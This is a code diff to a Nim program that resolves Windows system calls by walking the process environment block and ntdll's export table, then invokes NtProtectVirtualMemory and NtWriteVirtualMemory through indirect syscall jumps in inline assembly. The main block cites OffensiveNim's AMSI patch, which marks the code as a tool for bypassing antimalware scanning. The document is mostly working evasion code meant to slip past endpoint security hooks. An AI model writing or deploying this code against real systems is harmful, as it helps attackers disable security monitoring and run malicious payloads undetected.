@@ -10,15 +10,18 @@ import ptr_math
 {.passC:"-masm=intel".}
 
 var 
+  currentPeb: PPEB
   ntProtectSyscall*: WORD
   ntWriteSyscall*: WORD
-  syscallJumpAddress: ByteAddress
+  ntProtectSyscallJumpAddress: ByteAddress
+  ntWriteSyscallJumpAddress: ByteAddress
 
 type
     HG_TABLE_ENTRY* = object
         pAddress*: PVOID
         dwHash*: uint64
         wSysCall*: WORD
+        syscallJumpAddress: ByteAddress
 
     PHG_TABLE_ENTRY* = ptr HG_TABLE_ENTRY
 
@@ -59,7 +62,8 @@ proc getTableEntry*(pImageBase: PVOID, pCurrentExportDirectory: PIMAGE_EXPORT_DI
         pAddrOfFunctions: ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfFunctions)
         pAddrOfNames: ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNames)
         pAddrOfOrdinals: ptr UncheckedArray[WORD] = cast[ptr UncheckedArray[WORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNameOrdinals)
-
+    
+    var foundFuncAddr: PVOID
     while cx < numFuncs:
         var 
             pFuncOrdinal: WORD = pAddrOfOrdinals[cx]
@@ -72,9 +76,28 @@ proc getTableEntry*(pImageBase: PVOID, pCurrentExportDirectory: PIMAGE_EXPORT_DI
             tableEntry.pAddress = pFuncAddr
             if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3)[] == 0xB8:
                 tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4)[]
-            return true
+                echo "[*] Found syscall"
+                foundFuncAddr = pFuncAddr
+            break
 
         cx = cx + 1
+    
+    if cx >= numFuncs:
+        echo "[!] Could not find syscall"
+        quit(1)
+
+    # resolve syscall instruction address to jump to
+    echo "[*] Resolving syscall jump addr..."
+    echo "[*] Base search address: " & $cast[int](foundFuncAddr)
+    var offset: UINT = 0
+    while true:
+        var currByte = cast[PDWORD](foundFuncAddr + offset)[]
+        if "050F0375" in $currByte.toHex:
+            echo "[*] Found corresponding syscall instruction in ntdll addr " & $cast[ByteAddress](foundFuncAddr + offset).toHex & ": " & $currByte.toHex
+            tableEntry.syscallJumpAddress = cast[ByteAddress](foundFuncAddr + offset) + sizeof(WORD)
+            return true
+        offset = offset + 1
+
     return false
 
 proc GetPEBAsm64*(): PPEB {.asmNoStackFrame.} =
@@ -83,28 +106,13 @@ proc GetPEBAsm64*(): PPEB {.asmNoStackFrame.} =
         ret
     """
 
-proc getSyscallInstructionAddress(ntdllModuleBaseAddr: PVOID): ByteAddress =
-    ## Get The address of a syscall instruction from ntdll to make sure all syscalls go through ntdll
-    echo "[*] Resolving syscall..."
-    echo "[*] NTDDL Base: " & $cast[int](ntdllModuleBaseAddr).toHex
-    var offset: UINT = 0
-    while true:
-        var currByte = cast[PDWORD](ntdllModuleBaseAddr + offset)[]
-        if "050F0375" in $currByte.toHex:
-            echo "[*] Found syscall in ntdll addr " & $cast[ByteAddress](ntdllModuleBaseAddr + offset).toHex & ": " & $currByte.toHex
-            return cast[ByteAddress](ntdllModuleBaseAddr + offset) + sizeof(WORD)
-        offset = offset + 1
-
-    echo "[!] Did not find a syscall instruction in ntdll..."
-    quit(1)
-
 proc getNextModule*(flink: var LIST_ENTRY): PLDR_DATA_TABLE_ENTRY =
     flink = flink.Flink[]
     return flinkToModule(flink)
 
-proc searchLoadedModules*(pCurrentPeb: PPEB, tableEntry: var HG_TABLE_ENTRY): bool =
+proc searchLoadedModules*(tableEntry: var HG_TABLE_ENTRY): bool =
     var 
-        currFlink: LIST_ENTRY = pCurrentPeb.Ldr.InMemoryOrderModuleList.Flink[]
+        currFlink: LIST_ENTRY = currentPeb.Ldr.InMemoryOrderModuleList.Flink[]
         currModule: PLDR_DATA_TABLE_ENTRY = flinkToModule(currFlink)
         moduleName: string
         pExportTable: PIMAGE_EXPORT_DIRECTORY
@@ -122,8 +130,6 @@ proc searchLoadedModules*(pCurrentPeb: PPEB, tableEntry: var HG_TABLE_ENTRY): bo
             continue
 
         if "ntdll" in moduleName.toLower():
-            syscallJumpAddress = getSyscallInstructionAddress(currModule.DLLBase)
-
             if not getExportTable(currModule, pExportTable):
                 echo "[-] Failed to get export table..."
                 return false
@@ -136,10 +142,8 @@ proc searchLoadedModules*(pCurrentPeb: PPEB, tableEntry: var HG_TABLE_ENTRY): bo
             break
     return false
 
-proc getSyscall(tableEntry: var HG_TABLE_ENTRY): bool =
-    let currentPeb: PPEB = GetPEBAsm64()
-       
-    if not searchLoadedModules(currentPeb, tableEntry):
+proc getSyscall(tableEntry: var HG_TABLE_ENTRY): bool =      
+    if not searchLoadedModules(tableEntry):
         return false
 
     return true
@@ -156,7 +160,7 @@ proc NtProtectVirtualMemory(ProcessHandle: Handle, BaseAddress: PVOID, NumberOfB
     asm """
         mov r10, rcx
         mov eax, `ntProtectSyscall`
-        mov r11, `syscallJumpAddress`
+        mov r11, `ntProtectSyscallJumpAddress`
         jmp r11
         ret
     """
@@ -165,14 +169,20 @@ proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVO
     asm """
         mov r10, rcx
         mov eax, `ntWriteSyscall`
-        mov r11, `syscallJumpAddress`
+        mov r11, `ntWriteSyscallJumpAddress`
         jmp r11
         ret
     """
 
 when isMainModule:
-    ntProtectSyscall = resolve_syscall("NtProtectVirtualMemory").wSysCall
-    ntWriteSyscall = resolve_syscall("NtWriteVirtualMemory").wSysCall
+    currentPeb = GetPEBAsm64()
+
+    let ntProtect = resolve_syscall("NtProtectVirtualMemory")
+    ntProtectSyscall = ntProtect.wSysCall
+    ntProtectSyscallJumpAddress = ntProtect.syscallJumpAddress
+    let ntWrite = resolve_syscall("NtWriteVirtualMemory")
+    ntWriteSyscall = ntWrite.wSysCall
+    ntWriteSyscallJumpAddress = ntWrite.syscallJumpAddress
 
     # https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim
     when defined amd64:
